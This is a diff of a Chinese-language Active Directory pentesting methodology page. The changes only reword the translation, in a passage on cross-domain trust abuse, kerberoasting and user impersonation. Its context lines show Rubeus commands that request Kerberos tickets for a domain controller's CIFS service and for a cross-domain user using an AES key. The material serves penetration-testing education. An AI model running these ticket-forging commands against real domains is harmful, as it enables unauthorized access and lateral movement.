@@ -60,7 +60,7 @@ IsDomain     : True
 
 ## 初始访问
 
-如果你 **无法** 在其他域中找到任何 **特殊** 访问权限，你仍然可以回到 AD 方法论，尝试从 **无特权用户** 提升权限（例如 kerberoasting）：
+如果你 **无法** 在其他域中找到你的用户的任何 **特殊** 访问权限，你仍然可以回到 AD 方法论，尝试从 **无特权用户** 提升权限（例如，进行 kerberoasting）：
 
 你可以使用 **Powerview 函数** 通过 `-Domain` 参数来 **枚举** **其他域**，如：
 ```powershell
@@ -102,7 +102,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### 完整的用户冒充方式
+### 完全方式冒充用户
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
